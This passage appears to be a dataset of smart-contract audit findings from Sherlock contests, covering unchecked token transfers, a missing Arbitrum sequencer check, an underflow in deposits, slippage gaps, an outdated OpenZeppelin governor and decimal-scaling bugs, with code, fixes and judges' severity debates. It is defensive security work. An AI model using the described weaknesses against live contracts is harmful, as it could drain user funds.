an escalation for this issue.чLenders who do not want the loans to be used more than once, have to bundle their transactions. Otherwise, it is possible that someone might roll their loan, especially if the capital requirements are not huge because anyone can roll any loan.\nCode Snippet\nTool used\nManual Review
Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFromчhighч```\n    function clear (uint256 reqID) external returns (uint256 loanID) {\n        Request storage req = requests[reqID];\n\n        factory.newEvent(reqID, CoolerFactory.Events.Clear);\n\n        if (!req.active) \n            revert Deactivated();\n        else req.active = false;\n\n        uint256 interest = interestFor(req.amount, req.interest, req.duration);\n        uint256 collat = collateralFor(req.amount, req.loanToCollateral);\n        uint256 expiration = block.timestamp + req.duration;\n\n        loanID = loans.length;\n        loans.push(\n            Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n        );\n        debt.transferFrom(msg.sender, owner, req.amount);\n    }\n```\nчUse safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\nSome tokens do not revert on failure, but instead return false (e.g. ZRX). https://github.com/d-xo/weird-erc20/#no-revert-on-failure tranfser/transferfrom is directly used to send tokens in many places in the contract and the return value is not checked. If the token send fails, it will cause a lot of serious problems. For example, in the clear function, if debt token is ZRX, the lender can clear request without providing any debt token.\n```\n    function clear (uint256 reqID) external returns (uint256 loanID) {\n        Request storage req = requests[reqID];\n\n        factory.newEvent(reqID, CoolerFactory.Events.Clear);\n\n        if (!req.active) \n            revert Deactivated();\n        else req.active = false;\n\n        uint256 interest = interestFor(req.amount, req.interest, req.duration);\n        uint256 collat = collateralFor(req.amount, req.loanToCollateral);\n        uint256 expiration = block.timestamp + req.duration;\n\n        loanID = loans.length;\n        loans.push(\n            Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n        );\n        debt.transferFrom(msg.sender, owner, req.amount);\n    }\n```\nч
No check if Arbitrum L2 sequencer is down in Chainlink feedsчmediumч```\n    function getEthPrice() internal view returns (uint) {\n        (, int answer,, uint updatedAt,) =\n            ethUsdPriceFeed.latestRoundData();\n\n        if (block.timestamp - updatedAt >= 86400)\n            revert Errors.StalePrice(address(0), address(ethUsdPriceFeed));\n\n        if (answer <= 0)\n            revert Errors.NegativePrice(address(0), address(ethUsdPriceFeed));\n\n        return uint(answer);\n    }\n```\nчUsing Chainlink in L2 chains such as Arbitrum requires to check if the sequencer is down to avoid prices from looking like they are fresh although they are not.\nThe bug could be leveraged by malicious actors to take advantage of the sequencer downtime.\n```\n    function getEthPrice() internal view returns (uint) {\n        (, int answer,, uint updatedAt,) =\n            ethUsdPriceFeed.latestRoundData();\n\n        if (block.timestamp - updatedAt >= 86400)\n            revert Errors.StalePrice(address(0), address(ethUsdPriceFeed));\n\n        if (answer <= 0)\n            revert Errors.NegativePrice(address(0), address(ethUsdPriceFeed));\n\n        return uint(answer);\n    }\n```\nч
GMX Reward Router's claimForAccount() can be abused to incorrectly add WETH to tokensInчmediumч```\nfunction canCallClaimFees()\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    return (true, WETH, new address[](0));\n}\n```\nчWhen `claimFees()` is called, the Controller automatically adds WETH to the user's account. However, in the case where no fees have accrued yet, there will not be WETH withdrawn. In this case, the user will have WETH added as an asset in their account, while they won't actually have any WETH holdings.\nWhen a user calls the GMX Reward Router's `claimFees()` function, the RewardRouterController confirms the validity of this call in the `canCallClaimFees()` function:\n```\nfunction canCallClaimFees()\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    return (true, WETH, new address[](0));\n}\n```\n\nThis function assumes that any user calling `claimFees()` will always receive `WETH`. However, this is only the case if their stake has been accruing.\nImagine the following two actions are taken in the same block:\nDeposit assets into GMX staking\nCall claimFees()\nThe result will be that `claimFees()` returns no `WETH`, but `WETH` is added to the account's asset list.\nThe same is true if a user performs the following three actions:\nCall claimFees()\nWithdraw all ETH from the WETH contract\nCall claimFees() againчThe best way to solve this is actually not at the Controller level. It's to solve the issue of fake assets being added once and not have to worry about it on the Controller level in the future.\n```\nfunction _updateTokensIn(address account, address[] memory tokensIn)\n    internal\n{\n    uint tokensInLen = tokensIn.length;\n    for(uint i; i < tokensInLen; // Add the line below\n// Add the line below\ni) {\n// Remove the line below\n        if (IAccount(account).hasAsset(tokensIn[i]) == false)\n// Add the line below\n        if (IAccount(account).hasAsset(tokensIn[i]) == false && IERC20(token).balanceOf(account) > 0)\n            IAccount(account).addAsset(tokensIn[i]);\n    }\n}\n```\n\nHowever, `_updateTokensIn()` is currently called before the function is executed in `exec()`, so that would need to be changed as well:\n```\nfunction exec(address account, address target, uint amt, bytes calldata data) external onlyOwner(account) {\n    bool isAllowed;\n    address[] memory tokensIn;\n    address[] memory tokensOut;\n    (isAllowed, tokensIn, tokensOut) = controller.canCall(target, (amt > 0), data);\n    if (!isAllowed) revert Errors.FunctionCallRestricted();\n// Remove the line below\n    _updateTokensIn(account, tokensIn);\n    (bool success,) = IAccount(account).exec(target, amt, data);\n    if (!success)\n        revert Errors.AccountInteractionFailure(account, target, amt, data);\n// Add the line below\n    _updateTokensIn(account, tokensIn);\n    _updateTokensOut(account, tokensOut);\n    if (!riskEngine.isAccountHealthy(account))\n        revert Errors.RiskThresholdBreached();\n}\n```\n\nWhile this fix does require changing a core contract, it would negate the need to worry about edge cases causing incorrect accounting of tokens on any future integrations, which I think is a worthwhile trade off.\nThis accuracy is especially important as Sentiment becomes better known and integrated into the Arbitrum ecosystem. While I know that having additional assets doesn't cause internal problems at present, it is hard to predict what issues inaccurate data will cause in the future. Seeing that Plutus is checking Sentiment contracts for their whitelist drove this point home — we need to ensure the data stays accurate, even in edge cases, or else there will be trickle down problems we can't currently predict.\nDiscussion\nbahurum\nEscalate for 50 USDC. I believe that this issue is Low severity. I filed a list of issues with same impact as a Low severity submission (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26). This issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. Otherwise, please provide a scenario where this issue leads to a loss or lockup of funds. The watson mentions some similiar issues judged as Medium in previous contests. I didn't see those before or I would have escalated them as well for the same reason.\nsherlock-admin\nEscalate for 50 USDC. I believe that this issue is Low severity. I filed a list of issues with same impact as a Low severity submission (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26). This issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. Otherwise, please provide a scenario where this issue leads to a loss or lockup of funds. The watson mentions some similiar issues judged as Medium in previous contests. I didn't see those before or I would have escalated them as well for the same reason.\nYou've created a valid escalation for 50 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nzobront\nBaharum is correct that within the protocol, as it stands, there are no risks of an account having an incorrect Assets list.\nBut Sentiment is becoming increasingly incorporated into the Arbitrum DeFi ecosystem. Sentiment purports that their account Asset lists are accurate and they go to extreme lengths with the Controller setup (and take on additional security risk) to track tokens in and out to keep it accurate. If it didn’t matter, they could just use the list of all allowed tokens when taking operations on an account.\nAs I stated in my Recommendations:\n[W]e need to ensure the data stays accurate, even in edge cases, or else there will be trickle down problems we can't currently predict.\nI believe this is a valid Medium, and is the kind of thing that Sentiment needs to understand when releasing new Controllers with the explicit goal of keeping Asset lists accurate as users interact with a given protocol.\nbahurum\nThank you for your reply.\nWhile I agree that data accuracy is desired, I'd like to insist that IMO the impact of this issue is not within Sherlock's definition of Medium severity issue, since there is no path to loss of funds, unless the contrary is shown.\nFor integration, if an asset with zero balance is in an account's asset list, I don't see that as a problem since an external protocol can check if the balance is positive if a zero balance ever causes issues.\nIf Sherlock thinks differently then I encourage them to reconsider my Low severity issue #26 along with your 2 issues #10 and #5 as a Medium.\nzobront\nI agree that your Low should be Medium.\nhrishibhat\nEscalation accepted.\nConsidering issue #26 as a valid medium in this case\nsherlock-admin\nEscalation accepted.\nConsidering issue #26 as a valid medium in this case\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чA user can force their account into a state where it has `WETH` on the asset list, but doesn't actually hold any `WETH`.\nThis specific Impact was judged as Medium for multiple issues in the previous contest:\nhttps://github.com/sherlock-audit/2022-11-sentiment-judging/issues/20\nhttps://github.com/sherlock-audit/2022-11-sentiment-judging/issues/7\nCode Snippet\nTool used\nManual Review
PerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow errorчmediumч```\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\nчPerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error\n```\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\n\n```\n    function _withdrawAsset(uint256 amount, address to) private {\n        if (amount > netAssetDeposits) {\n            revert InsufficientAssetDeposits(netAssetDeposits, amount);\n        }\n        netAssetDeposits -= amount;\n\n\n        vault.withdraw(address(assetToken), amount);\n        IERC20(assetToken).transfer(to, amount);\n    }\n```\n\nThe problem here is that when user deposits X assets, then he receives Y UXD tokens. And when later he redeems his Y UXD tokens he can receive more or less than X assets. This can lead to situation when netAssetDeposits variable will be seting to negative value which will revert tx.\nExample. 1.User deposits 1 WETH when it costs 1200$. As result 1200 UXD tokens were minted and netAssetDeposits was set to 1. 2.Price of WETH has decreased and now it costs 1100. 3.User redeem his 1200 UXD tokens and receives from perp protocol 1200/1100=1.09 WETH. But because netAssetDeposits is 1, then transaction will revert inside `_withdrawAsset` function with underflow error.чAs you don't use this variable anywhere else, you can remove it. Otherwise you need to have 2 variables instead: totalDeposited and totalWithdrawn.\nDiscussion\nWarTech9\nOne fix: `netAssetDeposits` should be updated during rebalancing.\nWarTech9\n@acamill This can only be partially fixed by updating `netAssetsDeposits` while rebalancing but that's only resolves the issue if rebalancing has occurred. It would still be possible to run into this if rebalancing has not yet occurred so its not a full fix. We could use 2 variables as suggested but due to changes in asset values between mints and redeems, those would diverge and would be meaningless. We already have the position size which tells us this information, thus removing this field is the better option.\nIAm0x52\nEscalate for 25 USDC\nThis should only be medium severity because it is an edge case for the following reasons:\nIt can only occur if the average withdraw price is chronically under the average deposit price.\nIt only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\nThis state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\nsherlock-admin\nEscalate for 25 USDC\nThis should only be medium severity because it is an edge case for the following reasons:\nIt can only occur if the average withdraw price is chronically under the average deposit price.\nIt only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\nThis state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\nYou've created a valid escalation for 25 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nGiven the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets. Considering this issue as medium\nsherlock-admin\nEscalation accepted\nGiven the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets. Considering this issue as medium\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\nhrishibhat\nFix: https://github.com/UXDProtocol/uxd-evm/pull/26\nIAm0x52\nFixes look good. `netAssetDeposits` is now updated on rebalancesчUser can't redeem all his UXD tokens.\nCode Snippet\nTool used\nManual Review
`rebalanceLite` should provide a slippage protectionчmediumч```\n    /// @param sqrtPriceLimitX96 tx will fill until it reaches this price but WON'T REVERT\n    struct InternalOpenPositionParams {\n        address trader;\n        address baseToken;\n        bool isBaseToQuote;\n        bool isExactInput;\n        bool isClose;\n        uint256 amount;\n        uint160 sqrtPriceLimitX96;\n    }\n```\nчUsers can lose funds while rebalancing.\nThe protocol provides two kinds of rebalancing functions - `rebalance()` and `rebalanceLite()`. While the function `rebalance()` is protected from an unintended slippage because the caller can specify `amountOutMinimum`, `rebalanceLite()` does not have this protection. This makes the user vulnerable to unintended slippage due to various scenarios.\nEspecially, according to the communication with the PERP dev team, it is possible for the Perp's ClearingHouse to fill the position partially when the price limit is specified (sqrtPriceLimitX96). It is also commented in the Perp contract comments here.\n```\n    /// @param sqrtPriceLimitX96 tx will fill until it reaches this price but WON'T REVERT\n    struct InternalOpenPositionParams {\n        address trader;\n        address baseToken;\n        bool isBaseToQuote;\n        bool isExactInput;\n        bool isClose;\n        uint256 amount;\n        uint160 sqrtPriceLimitX96;\n    }\n```\n\nSo it is possible that the order is not placed to the full `amount`. As we can see in the #L626~#L628, the UXD protocol grabs the quote token of `amount` and deposits to the Perp's vault. And the unused `amount` will remain in the Perp vault while this is supposed to be returned to the user who called this rebalance function.чAdd a protection parameter to the function `rebalanceLite()` so that the user can specify the minimum out amount.\nDiscussion\nWarTech9\nThe caller can specify the target price using the `sqrtPriceLimitX96` parameter to the `rebalanceLite` function. This offers slippage protection.\nhansfriese\nEscalate for 10 USDC\nI suggest the judge and the sponsor read this issue carefully again. The key problem is that the Perp protocol can partially fill the position, especially when the `sqrtPriceLimitX96` is specified. (This is related to how Uniswap works, check here) So it is possible that the order is not placed to the full amount and the remaining amount should be returned to the user. I admit that my explanation sounded vague because I mentioned slippage. I mean, the protocol should return the remaining value or allow the user to explicitly specify the minimum output amount. Please check the screenshot of the chat I had with the Perp team. They confirmed it is possible that the order is not filled to the full amount when the `sqrtPriceLimitX96` is specified.\n\nsherlock-admin\nEscalate for 10 USDC\nI suggest the judge and the sponsor read this issue carefully again. The key problem is that the Perp protocol can partially fill the position, especially when the `sqrtPriceLimitX96` is specified. (This is related to how Uniswap works, check here) So it is possible that the order is not placed to the full amount and the remaining amount should be returned to the user. I admit that my explanation sounded vague because I mentioned slippage. I mean, the protocol should return the remaining value or allow the user to explicitly specify the minimum output amount. Please check the screenshot of the chat I had with the Perp team. They confirmed it is possible that the order is not filled to the full amount when the `sqrtPriceLimitX96` is specified.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nWarTech9\nWith the updated comments I agree there is a valid issue here. If the requested amount is not filled completely in the Perp order, we should only transfer from the user the amount returned from the `_placePerpOrder()` call.\nhrishibhat\nEscalation accepted.\nAs pointed out in the Escalation that there is the possibility of partial order fills when sqrtPriceLimitX96 is specified.\nsherlock-admin\nEscalation accepted.\nAs pointed out in the Escalation that there is the possibility of partial order fills when sqrtPriceLimitX96 is specified.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чUsers can lose funds while lite rebalancing.\nCode Snippet\nTool used\nManual Review
`PerpDepository._rebalanceNegativePnlWithSwap()` shouldn't use a `sqrtPriceLimitX96` twice.чmediumч```\n    function _rebalanceNegativePnlWithSwap(\n        uint256 amount,\n        uint256 amountOutMinimum,\n        uint160 sqrtPriceLimitX96,\n        uint24 swapPoolFee,\n        address account\n    ) private returns (uint256, uint256) {\n        uint256 normalizedAmount = amount.fromDecimalToDecimal(\n            ERC20(quoteToken).decimals(),\n            18\n        );\n        _checkNegativePnl(normalizedAmount);\n        bool isShort = false;\n        bool amountIsInput = true;\n        (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n            normalizedAmount,\n            isShort,\n            amountIsInput,\n            sqrtPriceLimitX96\n        );\n        vault.withdraw(assetToken, baseAmount);\n        SwapParams memory params = SwapParams({\n            tokenIn: assetToken,\n            tokenOut: quoteToken,\n            amountIn: baseAmount,\n            amountOutMinimum: amountOutMinimum,\n            sqrtPriceLimitX96: sqrtPriceLimitX96, //@audit \n            poolFee: swapPoolFee\n        });\n        uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n```\nч`PerpDepository._rebalanceNegativePnlWithSwap()` shouldn't use a `sqrtPriceLimitX96` twice.\nCurrently, `_rebalanceNegativePnlWithSwap()` uses a `sqrtPriceLimitX96` param twice for placing a perp order and swapping.\n```\n    function _rebalanceNegativePnlWithSwap(\n        uint256 amount,\n        uint256 amountOutMinimum,\n        uint160 sqrtPriceLimitX96,\n        uint24 swapPoolFee,\n        address account\n    ) private returns (uint256, uint256) {\n        uint256 normalizedAmount = amount.fromDecimalToDecimal(\n            ERC20(quoteToken).decimals(),\n            18\n        );\n        _checkNegativePnl(normalizedAmount);\n        bool isShort = false;\n        bool amountIsInput = true;\n        (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n            normalizedAmount,\n            isShort,\n            amountIsInput,\n            sqrtPriceLimitX96\n        );\n        vault.withdraw(assetToken, baseAmount);\n        SwapParams memory params = SwapParams({\n            tokenIn: assetToken,\n            tokenOut: quoteToken,\n            amountIn: baseAmount,\n            amountOutMinimum: amountOutMinimum,\n            sqrtPriceLimitX96: sqrtPriceLimitX96, //@audit \n            poolFee: swapPoolFee\n        });\n        uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n```\n\nIn `_placePerpOrder()`, it uses the uniswap pool inside the perp protocol and uses a `spotSwapper` for the second swap which is for the uniswap as well.\nBut as we can see here, Uniswap V3 introduces multiple pools for each token pair and 2 pools might be different and I think it's not good to use the same `sqrtPriceLimitX96` for different pools.\nAlso, I think it's not mandatory to check a `sqrtPriceLimitX96` as it checks `amountOutMinimum` already. (It checks `amountOutMinimum` only in `_openLong()` and _openShort().)чI think we can use the `sqrtPriceLimitX96` param for one pool only and it would be enough as there is an `amountOutMinimum` condition.ч`PerpDepository._rebalanceNegativePnlWithSwap()` might revert when it should work as it uses the same `sqrtPriceLimitX96` for different pools.\nCode Snippet\nTool used\nManual Review
Vulnerable GovernorVotesQuorumFraction versionчmediumч```\n contract UXDGovernor is\n    ReentrancyGuard,\n    Governor,\n    GovernorVotes,\n    GovernorVotesQuorumFraction,\n    GovernorTimelockControl,\n    GovernorCountingSimple,\n    GovernorSettings\n```\nч"The protocol uses an OZ version of contracts that contain a known vulnerability in government contracts.\n`UXDGovernor` contract inherits from GovernorVotesQuorumFraction:\n```\n contract UXDGovernor is\n    ReentrancyGuard,\n    Governor,\n    GovernorVotes,\n    GovernorVotesQuorumFraction,\n    GovernorTimelockControl,\n    GovernorCountingSimple,\n    GovernorSettings\n```\n\nAn OZ security recommendation has revealed a known vulnerability in this contract: https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75\nIt was patched in version 4.7.2, but this protocol uses an older version: ""@openzeppelin/contracts"": ""^4.6.0"""чUpdate the OZ version of contracts to version >=4.7.2 or at least follow the workarounds of OZ if not possible otherwise.\nDiscussion\nWarTech9\nThis was already fixed here: https://github.com/UXDProtocol/uxd-evm/commit/dcaa0e857111f3f7946ee5c5a188dbb23ca80859\nhrishibhat\nThis requires certain scenario where the previous quorum should have failed & the quorum fraction has to be changed post which this issue could be valid. Considering this issue a valid medium.чThe potential impact is described in the OZ advisory. This issue was assigned with a severity of High from OZ, so I am sticking with it in this submission.\nCode Snippet\nTool used\nManual Review
PerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow errorчmediumч```\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\nчPerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error\n```\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\n\n```\n    function _withdrawAsset(uint256 amount, address to) private {\n        if (amount > netAssetDeposits) {\n            revert InsufficientAssetDeposits(netAssetDeposits, amount);\n        }\n        netAssetDeposits -= amount;\n\n\n        vault.withdraw(address(assetToken), amount);\n        IERC20(assetToken).transfer(to, amount);\n    }\n```\n\nThe problem here is that when user deposits X assets, then he receives Y UXD tokens. And when later he redeems his Y UXD tokens he can receive more or less than X assets. This can lead to situation when netAssetDeposits variable will be seting to negative value which will revert tx.\nExample. 1.User deposits 1 WETH when it costs 1200$. As result 1200 UXD tokens were minted and netAssetDeposits was set to 1. 2.Price of WETH has decreased and now it costs 1100. 3.User redeem his 1200 UXD tokens and receives from perp protocol 1200/1100=1.09 WETH. But because netAssetDeposits is 1, then transaction will revert inside `_withdrawAsset` function with underflow error.ч
ERC5095 has not approved MarketPlace to spend tokens in ERC5095чmediumч```\n    function sellUnderlying(\n        address u,\n        uint256 m,\n        uint128 a,\n        uint128 s\n    ) external returns (uint128) {\n        // Get the pool for the market\n        IPool pool = IPool(pools[u][m]);\n\n        // Get the number of PTs received for selling `a` underlying tokens\n        uint128 expected = pool.sellBasePreview(a);\n\n        // Verify slippage does not exceed the one set by the user\n        if (expected < s) {\n            revert Exception(16, expected, 0, address(0), address(0));\n        }\n\n        // Transfer the underlying tokens to the pool\n        Safe.transferFrom(IERC20(pool.base()), msg.sender, address(pool), a);\n// rest of code\n    function sellPrincipalToken(\n        address u,\n        uint256 m,\n        uint128 a,\n        uint128 s\n    ) external returns (uint128) {\n        // Get the pool for the market\n        IPool pool = IPool(pools[u][m]);\n\n        // Preview amount of underlying received by selling `a` PTs\n        uint256 expected = pool.sellFYTokenPreview(a);\n\n        // Verify that the amount needed does not exceed the slippage parameter\n        if (expected < s) {\n            revert Exception(16, expected, s, address(0), address(0));\n        }\n\n        // Transfer the principal tokens to the pool\n        Safe.transferFrom(\n            IERC20(address(pool.fyToken())),\n            msg.sender,\n            address(pool),\n            a\n        );\n```\nчERC5095 requires approving MarketPlace to spend the tokens in ERC5095 before calling MarketPlace.sellUnderlying/sellPrincipalToken\nMarketPlace.sellUnderlying/sellPrincipalToken will call transferFrom to send tokens from msg.sender to pool, which requires msg.sender to approve MarketPlace. However, before calling MarketPlace.sellUnderlying/sellPrincipalToken in ERC5095, there is no approval for MarketPlace to spend the tokens in ERC5095, which causes functions such as ERC5095.deposit/mint/withdraw/redeem functions fail, i.e. users cannot sell tokens through ERC5095.\n```\n    function sellUnderlying(\n        address u,\n        uint256 m,\n        uint128 a,\n        uint128 s\n    ) external returns (uint128) {\n        // Get the pool for the market\n        IPool pool = IPool(pools[u][m]);\n\n        // Get the number of PTs received for selling `a` underlying tokens\n        uint128 expected = pool.sellBasePreview(a);\n\n        // Verify slippage does not exceed the one set by the user\n        if (expected < s) {\n            revert Exception(16, expected, 0, address(0), address(0));\n        }\n\n        // Transfer the underlying tokens to the pool\n        Safe.transferFrom(IERC20(pool.base()), msg.sender, address(pool), a);\n// rest of code\n    function sellPrincipalToken(\n        address u,\n        uint256 m,\n        uint128 a,\n        uint128 s\n    ) external returns (uint128) {\n        // Get the pool for the market\n        IPool pool = IPool(pools[u][m]);\n\n        // Preview amount of underlying received by selling `a` PTs\n        uint256 expected = pool.sellFYTokenPreview(a);\n\n        // Verify that the amount needed does not exceed the slippage parameter\n        if (expected < s) {\n            revert Exception(16, expected, s, address(0), address(0));\n        }\n\n        // Transfer the principal tokens to the pool\n        Safe.transferFrom(\n            IERC20(address(pool.fyToken())),\n            msg.sender,\n            address(pool),\n            a\n        );\n```\n\nIn the test file, `vm.startPrank(address(token))` is used and approves the MarketPlace, which cannot be done in the mainnet\n```\n        vm.startPrank(address(token));\n        IERC20(Contracts.USDC).approve(address(marketplace), type(uint256).max);\n        IERC20(Contracts.YIELD_TOKEN).approve(\n            address(marketplace),\n            type(uint256).max\n        );\n```\nч
Two token vault will be broken if it comprises tokens with different decimalsчhighч```\nscaleFactor = poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor\nscaleFactor = 1e30 * 1e18 / 1e18\nscaleFactor = 1e30\n```\nчA two token vault that comprises tokens with different decimals will have many of its key functions broken. For instance, rewards cannot be reinvested and vault cannot be settled.\nThe `Stable2TokenOracleMath._getSpotPrice` function is used to compute the spot price of two tokens.\nTwo tokens (USDC and DAI) with different decimals will be used below to illustrate the issue:\nUSDC/DAI Spot Price\nAssume that the primary token is DAI (18 decimals) and the secondary token is USDC (6 decimals). As such, the scaling factors would be as follows. The token rate is ignored and set to 1 for simplicity.\nPrimary Token (DAI)'s scaling factor = 1e18\n`scaling factor = FixedPoint.ONE (1e18) * decimals difference to reach 18 decimals (1e0) * token rate (1)\nscaling factor = 1e18`\nSecondary Token (USDC)'s scaling factor = 1e30\n`scaling factor = FixedPoint.ONE (1e18) * decimals difference to reach 18 decimals (1e12) * token rate (1)\nscaling factor = 1e18 * 1e12 = 1e30`\nAssume that the `primaryBalance` is 100 DAI (100e18), and the `secondaryBalance` is 100 USDC (100e6). Line 25 - 28 of the `_getSpotPrice` function will normalize the tokens balances to 18 decimals as follows:\n`scaledPrimaryBalance` will be 100e18 (It remains the same as no scaling is needed because DAI is already denominated in 18 decimals)\n`scaledPrimaryBalance = primaryBalance * poolContext.primaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n`scaledPrimaryBalance` = 100e18 * 1e18 / 1e18\n`scaledPrimaryBalance` = 100e18`\n`scaledSecondaryBalance` will upscale to 100e18\n`scaledSecondaryBalance = `scaledSecondaryBalance` * poolContext.primaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n`scaledSecondaryBalance` = 100e6 * 1e30 / 1e18\n`scaledSecondaryBalance` = 100e18`\nThe `StableMath._calcSpotPrice` function at Line 39 returns the spot price of Y/X. In this example, `balanceX` is DAI, and `balanceY` is USDC. Thus, the spot price will be USDC/DAI. This means the amount of USDC I will get for each DAI.\nWithin Balancer, all stable math calculations within the Balancer's pools are performed in `1e18`. With both the primary and secondary balances normalized to 18 decimals, they can be safely passed to the `StableMath._calculateInvariant` and `StableMath._calcSpotPrice` functions to compute the spot price. Assuming that the price of USDC and DAI is perfectly symmetric (1 DAI can be exchanged for exactly 1 USDC, and vice versa), the spot price returned from the `StableMath._calcSpotPrice` will be `1e18`. Note that the spot price returned by the `StableMath._calcSpotPrice` function will be denominated in 18 decimals.\nIn Line 47-50 within the `Stable2TokenOracleMath._getSpotPrice` function, it attempts to downscale the spot price to normalize it back to the original decimals and token rate (e.g. stETH back to wstETH) of the token.\nThe `scaleFactor` at Line 47 will be evaluated as follows:\n```\nscaleFactor = poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor\nscaleFactor = 1e30 * 1e18 / 1e18\nscaleFactor = 1e30\n```\n\nFinally, the spot price will be scaled in reverse order and it will be evaluated to `1e6` as shown below:\n```\nspotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\nspotPrice = 1e18 * 1e18 / 1e30\nspotPrice = 1e6\n```\n\nDAI/USDC Spot Price\nIf it is the opposite where the primary token is USDC (6 decimals) and the secondary token is DAI (18 decimals), the calculation of the spot price will be as follows:\nThe `scaleFactor` at Line 47 will be evaluated to as follows:\n```\nscaleFactor = poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor\nscaleFactor = 1e18 * 1e18 / 1e30\nscaleFactor = 1e6\n```\n\nFinally, the spot price will be scaled in reverse order and it will be evaluated to `1e30` as shown below:\n```\nspotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\nspotPrice = 1e18 * 1e18 / 1e6\nspotPrice = 1e30\n```\n\nNote about the spot price\nAssuming that the spot price of USDC and DAI is 1:1. As shown above, if the decimals of two tokens are not the same, the final spot price will end up either 1e6 (USDC/DAI) or 1e30 (DAI/USDC). However, if the decimals of two tokens (e.g. wstETH and WETH) are the same, this issue stays hidden as the `scaleFactor` in Line 47 will always be 1e18 as both `secondaryScaleFactor` and `primaryScaleFactor` cancel out each other.\nIt was observed that the spot price returned from the `Stable2TokenOracleMath._getSpotPrice` function is being compared with the oracle price from the `TwoTokenPoolUtils._getOraclePairPrice` function to determine if the pool has been manipulated within many functions.\n```\nuint256 oraclePrice = poolContext._getOraclePairPrice(strategyContext.tradingModule);\n```\n\nBased on the implementation of the `TwoTokenPoolUtils._getOraclePairPrice` function , the `oraclePrice` returned by this function is always denominated in 18 decimals regardless of the decimals of the underlying tokens. For instance, assume the spot price of USDC (6 decimals) and DAI (18 decimals) is 1:1. The spot price returned by this oracle function for USDC/DAI will be `1e18` and DAI/USDC will be `1e18`.\nIn many functions, the spot price returned from the `Stable2TokenOracleMath._getSpotPrice` function is compared with the oracle price via the `Stable2TokenOracleMath._checkPriceLimit`. Following is one such example. The `oraclePrice` will be `1e18`, while the `spotPrice` will be either `1e6` or `1e30` in our example. This will cause the `_checkPriceLimit` to always revert because of the large discrepancy between the two prices.\nOther affected functions include the following:\nStable2TokenOracleMath._validateSpotPriceAndPairPrice\nStable2TokenOracleMath._getTimeWeightedPrimaryBalanceч
Rounding differences when computing the invariantчhighч```\n    function _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n        internal\n        pure\n        returns (uint256)\n    {\n        /**********************************************************************************************\n        // invariant                                                                                 //\n        // D = invariant                                                  D^(n+1)                    //\n        // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n        // S = sum of balances                                             n^n P                     //\n        // P = product of balances                                                                   //\n        // n = number of tokens                                                                      //\n        **********************************************************************************************/\n\n        // Always round down, to match Vyper's arithmetic (which always truncates).\n\n        uint256 sum = 0; // S in the Curve version\n        uint256 numTokens = balances.length;\n        for (uint256 i = 0; i < numTokens; i++) {\n            sum = sum.add(balances[i]);\n        }\n        if (sum == 0) {\n            return 0;\n        }\n        ..SNIP..\n```\nчThe invariant used within Boosted3Token vault to compute the spot price is not aligned with the Balancer's 